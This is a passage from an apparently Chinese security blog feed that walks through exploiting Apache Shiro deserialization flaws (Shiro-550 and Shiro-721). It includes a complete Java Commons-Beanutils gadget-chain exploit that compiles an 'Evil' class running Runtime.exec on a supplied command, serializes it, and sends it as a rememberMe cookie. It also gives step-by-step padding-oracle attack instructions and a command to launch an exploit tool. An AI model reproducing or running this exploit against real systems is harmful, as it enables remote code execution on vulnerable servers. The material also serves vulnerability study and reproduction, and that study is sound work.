System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>然后再将生成的编码进行<code>cookie</code>传参</strong></p><p><img src="../images/image-20230619205759940.png" alt="image-20230619205759940"></p><h3 id="Commons-Beanutils1链"><a href="#Commons-Beanutils1链" class="headerlink" title="Commons-Beanutils1链"></a>Commons-Beanutils1链</h3><p>上面的CC6+TemplatesImpl链是依赖于Commmons Collections软件包的，如果项目中没有用到的话就无法实现代码执行，那有没有只用Shiro自己的类就能实现代码执行的链呢？答案是有的。这里用到了Apache Commons Beanutils包。</p><p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法。关于JavaBean的说明可以参考<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">这篇文章</a>。</p><p>这里的话我也写了一篇文章来说分析这个cb链   <a href="https://ke1nys.github.io/posts/f52590e9.html">java-Commons-BeanUtils</a></p><p><strong>简单来说就是这个链子可以任意进行getter操作</strong></p><p>如何利用这个<code>PropertyUtils.getProperty()</code>方法去构造我们的利用链呢？回顾CC链中没有用到Commons Collections包的部分，再次搬出这张图</p><p><img src="../images/20220504154547.png" alt="img"></p><p>其中红框的部分就是没有用到Commons Collections包的部分，如此一来，CC3中的TemplatesImpl实现类加载任意代码执行是跑不掉的，所以我们要找找那里能调用<code>TemplatesImpl.newTransformer()</code>方法，然后我们找到了<code>TemplatesImpl.getOutputProperties()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它的内部调用了 <code>newTransformer()</code>，而 <code>getOutputProperties</code> 这个名字，是以 <code>get</code> 开头，正符合getter的定义。</p><p>所以， <code>PropertyUtils.getProperty( obj, property )</code> 这段代码，当obj是一个 <code>TemplatesImpl</code> 对象，而 <code>property</code> 的值为 <code>outputProperties</code> 时，将会自动调用getter，也就是 <code>TemplatesImpl.getOutputProperties()</code> 方法，触发代码执行。</p><p><img src="../images/20220503224944.png" alt="img"></p><p><strong>这就是一条cb链而已</strong>     <strong>但是这个cb链和上面给的链接的cb链子不是一回事</strong></p><p><strong>因为用的依赖不同</strong>    <strong>所以如果直接用上面的cb链来打的话会执行失败并且报错</strong>   </p><p>所以这里得重新构造(<strong>但是区别不是很大</strong>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fileName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fileName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line"></span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"><span class="comment">//这个add里的数值要注意一下，必须传的是string类型，不然会报错</span></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        serialize(queue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里和上面常规的cb链不同的是   </p><p><img src="../images/image-20230620154157363.png" alt="image-20230620154157363"></p><p>将这里进行了修改  因为就是如果不修改的话会报错</p><p><img src="../images/image-20230620154306119.png" alt="image-20230620154306119"></p><p>就是会报这个错误</p><p><img src="../images/image-20230620154552684.png" alt="image-20230620154552684"></p><p>然后就解决了这个问题，就可以成功进行恶意代码执行了</p><p><img src="../images/image-20230620154446944.png" alt="image-20230620154446944"></p><p><a href="http://arsenetang.com/2022/03/10/Java%E7%AF%87%E4%B9%8B%E5%88%A9%E7%94%A8CB%E9%93%BE%E6%94%BB%E5%87%BBshiro/#The-first-%E6%8A%A5%E9%94%99">Shiro中常见的三种错误 </a>    <strong>在复现shiro的过程中如果遇到问题可以来看看这里  基本都能得到解决</strong></p><h2 id="Shiro-721反序列化漏洞"><a href="#Shiro-721反序列化漏洞" class="headerlink" title="Shiro-721反序列化漏洞"></a>Shiro-721反序列化漏洞</h2><p><a href="https://goodapple.top/archives/261">参考文章</a>   </p><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在Shiro721漏洞中，由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle Attack来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p><p>虽然使用Padding Oracle Attack<strong>可以绕过密钥直接构造攻击密文</strong>，但是在进行攻击之前我们需要获取一个合法用户的Cookie。</p><h3 id="漏洞流程"><a href="#漏洞流程" class="headerlink" title="漏洞流程"></a>漏洞流程</h3><ul><li>登录网站获取合法Cookie</li><li>使用rememberMe字段进行Padding Oracle Attack，获取intermediary</li><li>利用intermediary构造出恶意的反序列化密文作为Cookie</li><li>使用新的Cookie请求网站执行攻击</li></ul><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li><strong>Shiro  &lt;=1.4.1</strong></li></ul><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>将<code>shrio-550</code>的的版本换掉就行</p><p><img src="../images/image-20230620163656141.png" alt="image-20230620163656141"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="密钥分析"><a href="#密钥分析" class="headerlink" title="密钥分析"></a>密钥分析</h4><p><img src="../images/image-20230620163758041.png" alt="image-20230620163758041"></p><p>跟进<code>generateNewKey</code>()</p><p><img src="../images/image-20230620163822678.png" alt="image-20230620163822678"></p><p>在接着跟进<code>generateNewKey</code></p><p><img src="../images/image-20230620163850243.png" alt="image-20230620163850243"></p><p>然后接着跟进<code>init</code></p><p><img src="../images/image-20230620163925489.png" alt="image-20230620163925489"></p><p>在接着跟进<code>init</code></p><p><img src="../images/image-20230620163954395.png" alt="image-20230620163954395"></p><p><img src="../images/image-20230620164051151.png" alt="image-20230620164051151"></p><p>获取完新的key之后，回到这里进行编码</p><p><img src="../images/image-20230620164134997.png" alt="image-20230620164134997"></p><p><img src="../images/image-20230620164158552.png" alt="image-20230620164158552"></p><p>加密方法还是<code>AES</code></p><p><img src="../images/image-20230620164246098.png" alt="image-20230620164246098"></p><p>最后跟进这个<code>setCipherKey</code>   就是将新生成的key来作为加密和解密的key</p><p><strong>至此就是Shiro721完整的密钥生成过程。</strong></p><h4 id="布尔条件"><a href="#布尔条件" class="headerlink" title="布尔条件"></a>布尔条件</h4><p>我们知道，Padding Oracle Attack攻击是一种类似于sql盲注的攻击，这就要求服务器端有能够被我们利用的布尔条件。在<a href="https://goodapple.top/2022/01/06/6db157fde87a6bae/">CBC字节翻转攻击&amp;Padding Oracle Attack原理解析</a>这篇文章中，我们模拟的服务器环境如下</p><ul><li>当收到一个有效的密文（一个被正确填充并包含有效数据的密文）时，应用程序正常响应（200 OK）</li><li>当收到无效的密文时（解密时填充错误的密文），应用程序会抛出加密异常（500 内部服务器错误）</li><li>当收到一个有效密文（解密时正确填充的密文）但解密为无效值时，应用程序会显示自定义错误消息 (200 OK)</li></ul><p>我们可以通过响应头来判断明文填充是否正确，进而爆破出中间值。那么对于解密不正确的Cookie，Shiro是怎么处理的呢？</p><p>(<strong>这里的话<code>Padding Oracle Attack</code>就不详细分析了，只讲结论</strong>)</p><ul><li><strong>Padding正确，服务器正常响应</strong></li><li><strong>Padding错误，服务器返回<code>Set-Cookie: rememberMe=deleteMe</code></strong></li></ul><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在Shiro550中，我们可以直接通过硬编码密钥直接生成攻击密文。但是Shiro721使用了动态密钥，无法直接获取密钥。但是仍然可以通过Padding Oracle Attack绕过密钥，直接生成攻击密文。</p><p>利用链和Shiro550类似，这里我们使用<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/tag/v2.51">ShiroExploit.V2.51</a>工具进行攻击测试。输入测试网址以及登录用户的Cookie</p><p><strong>然后就可以利用工具进行测试了</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; &#x27;C:\Program Files\Java\jdk1.8.0_202\bin\java.exe&#x27; -jar .\ShiroExploit.jar</span><br></pre></td></tr></table></figure><p><strong>这是我的启动方式  (因为环境变量是17，用不了)</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://juejin.cn/post/7133959651653058574&quot;&gt;参考文章1&lt;/a&gt;     &lt;a href=&quot;https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.</summary>
      
    
    
    
    
    <category term="java-shiro" scheme="https://ke1nys.github.io/tags/java-shiro/"/>
    
  </entry>
  
</feed>
